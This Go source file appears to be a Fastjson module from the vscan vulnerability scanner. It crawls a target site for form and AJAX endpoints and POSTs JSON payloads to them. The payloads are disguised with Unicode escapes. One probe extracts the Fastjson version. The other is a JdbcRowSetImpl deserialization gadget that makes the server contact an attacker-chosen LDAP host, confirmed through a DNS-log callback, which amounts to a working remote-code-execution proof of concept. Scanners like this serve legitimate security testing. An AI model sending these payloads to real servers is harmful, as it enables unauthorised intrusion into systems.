package fastjson

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"net/url"
	"regexp"
	"strings"
)

var (
	payload1   = `{"\u0040\u0074\u0079\u0070\u0065": "\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0041\u0075\u0074\u006F\u0043\u006C\u006F\u0073\u0065\u0061\u0062\u006C\u0065"`
	payload2_1 = `{"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"f":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"ldap://`
	payload2_2 = `/object","autoCommit":true}}`
)

func Check(u string) string {
	domainx := getinputurl(u)
	for _, jsonurl := range domainx {
		header := make(map[string]string)
		header["Content-Type"] = "application/json;charset=UTF-8"
		if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
			randomstr := pkg.RandomStr()
			if _, err := pkg.HttpRequset(jsonurl, "POST", payload2_1+randomstr+"."+pkg.CeyeDomain+payload2_2, false, header); err == nil {
				if pkg.Dnslogchek(randomstr) {
					pkg.GoPocLog(fmt.Sprintf("Found vuln FastJson LDAP RCE |%s\n", u))
					return "LDAP RCE"
				}
			}
		} else {
			if req, err := pkg.HttpRequset(jsonurl, "POST", payload1, false, header); err == nil {
				fastjsonreg := regexp.MustCompile(`fastjson-version (1\.2\.\d+)`)
				fastjsonversionlilst := fastjsonreg.FindStringSubmatch(req.Body)
				if fastjsonversionlilst != nil {
					pkg.GoPocLog(fmt.Sprintf("Found vuln fastjson version %s|%s\n", fastjsonversionlilst[len(fastjsonversionlilst)-1:][0], u))
					return fastjsonversionlilst[len(fastjsonversionlilst)-1:][0]
				}
			}
		}

	}
	return ""
}

func getinputurl(domainurl string) (domainurlx []string) {
	req, err := pkg.HttpRequset(domainurl, "GET", "", true, nil)
	if err != nil {
		return nil
	}
	var loginurl []string
	hrefreg := regexp.MustCompile(`location.href='(.*?)'`)
	hreflist := hrefreg.FindStringSubmatch(req.Body)
	if hreflist != nil {
		req, err = pkg.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
		if err != nil {
			return nil
		}
	}
	domainreg := regexp.MustCompile(`<form.*?action="(.*?)"`)
	domainlist := domainreg.FindStringSubmatch(req.Body)
	if domainlist != nil {
		domainx := domainlist[len(domainlist)-1:][0]
		if strings.Contains(domainx, "http") {
			loginurl = append(loginurl, domainx)
		} else if domainx == "" {
			loginurl = loginurl
		} else if domainx[0:1] == "/" {
			u, _ := url.Parse(domainurl)
			loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
		} else {
			loginurl = append(loginurl, domainurl+"/"+domainx)
		}
	}
	domainreg2 := regexp.MustCompile(`ajax[\s\S]*?url.*?['|"](.*?)['|"]`)
	domainlist2 := domainreg2.FindAllStringSubmatch(req.Body, -1)
	if domainlist2 != nil {
		for _, a := range domainlist2 {
			domainx := a[1]
			if strings.Contains(domainx, "http") {
				loginurl = append(loginurl, domainx)
			} else if domainx == "" {
				loginurl = append(loginurl, domainurl)
			} else if domainx[0:1] == "/" {
				u, _ := url.Parse(domainurl)
				loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
			} else {
				loginurl = append(loginurl, domainurl+"/"+domainx)
			}
		}
	}
	return loginurl
}
